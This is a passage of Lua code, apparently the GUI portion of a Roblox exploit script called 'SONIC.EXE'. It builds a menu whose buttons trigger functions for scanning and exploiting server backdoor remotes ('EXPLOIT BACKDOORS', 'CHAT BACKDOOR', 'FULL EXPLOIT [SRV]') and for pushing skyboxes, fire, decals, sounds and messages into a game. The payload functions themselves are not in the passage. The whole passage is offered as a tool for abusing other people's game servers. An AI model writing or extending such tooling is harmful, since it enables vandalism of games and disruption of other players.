    container.ScrollBarImageColor3 = Color3.fromRGB(80, 0, 0)
    container.AutomaticCanvasSize = Enum.AutomaticSize.Y
    container.CanvasSize = UDim2.new(0, 0, 0, 0)
    container.Parent = main

    local layout = Instance.new("UIListLayout")
    layout.Padding = UDim.new(0, 3)
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    layout.Parent = container

    local pad = Instance.new("UIPadding")
    pad.PaddingTop = UDim.new(0, 4)
    pad.PaddingLeft = UDim.new(0, 6)
    pad.PaddingRight = UDim.new(0, 6)
    pad.PaddingBottom = UDim.new(0, 4)
    pad.Parent = container

    local btnCount = 0

    local function Btn(text, cb)
        btnCount = btnCount + 1
        local b = Instance.new("TextButton")
        b.Name = "B" .. btnCount
        b.Size = UDim2.new(1, 0, 0, 24)
        b.BackgroundColor3 = Color3.fromRGB(20, 12, 12)
        b.Text = text
        b.TextColor3 = Color3.fromRGB(200, 60, 60)
        b.TextSize = 10
        b.Font = Enum.Font.SourceSans
        b.BorderSizePixel = 0
        b.Parent = container
        b.MouseButton1Down:Connect(function()
            pcall(cb)
        end)
    end

local function Section(text)
        btnCount = btnCount + 1
        local l = Instance.new("TextLabel")
        l.Name = "S" .. btnCount
        l.Size = UDim2.new(1, 0, 0, 16)
        l.BackgroundTransparency = 1
        l.Text = text
        l.TextColor3 = Color3.fromRGB(100, 40, 40)
        l.TextSize = 9
        l.Font = Enum.Font.SourceSansBold
        l.TextXAlignment = Enum.TextXAlignment.Left
        l.Parent = container
    end

    Section("── SERVER-SIDE ──")
    Btn("SKYBOX [SRV]", ServerSkybox)
    Btn("FIRE [SRV]", ServerFire)
    Btn("DECALS [SRV]", ServerDecals)
    Btn("SOUND [SRV]", ServerSound)
    Btn("MESSAGE [SRV]", ServerMessage)
    Btn("PARTICLES [SRV]", ServerParticles)
    Btn("INSTANCE [SRV]", ServerInstance)
    Btn("FULL EXPLOIT [SRV]", ServerFull)

    Section("── BACKDOOR ──")
    Btn("SCAN BACKDOORS", function()
        local backdoors = GetBackdoorRemotes()
        Log("Found " .. #backdoors .. " suspicious remotes")
        for i, data in ipairs(backdoors) do
            if i <= 10 then
                Log(i .. ". " .. data.priority .. " | " .. data.name .. " | score: " .. data.score)
            end
        end
    end)
    Btn("EXPLOIT BACKDOORS", ServerBackdoor)
    Btn("CHAT BACKDOOR", ServerChatBackdoor)

    Section("── CLIENT-SIDE ──")
    Btn("SKYBOX [CLI]", ClientSkybox)
    Btn("FIRE [CLI]", ClientFire)
    Btn("PARTICLES [CLI]", ClientParticles)
    Btn("DECALS [CLI]", ClientDecals)
    Btn("SOUND [CLI]", ClientSound)
    Btn("MESSAGE [CLI]", ClientMessage)
    Btn("FULL CHAOS [CLI]", ClientFull)

    Section("── CLEAR ──")
    Btn("CLEAR ALL", ClearAll)

    local minimized = false
    closeBtn.MouseButton1Down:Connect(function()
        minimized = not minimized
        if minimized then
            container.Visible = false
            main.Size = UDim2.new(0, 190, 0, 26)
            closeBtn.Text = "+"
        else
            container.Visible = true
            main.Size = UDim2.new(0, 190, 0, 280)
            closeBtn.Text = "—"
        end
    end)

    return panel
end

BuildPanel()

Log("SONIC.EXE loaded")
Log("Backdoor scanner: 100+ patterns")
Log("Particle system: ready")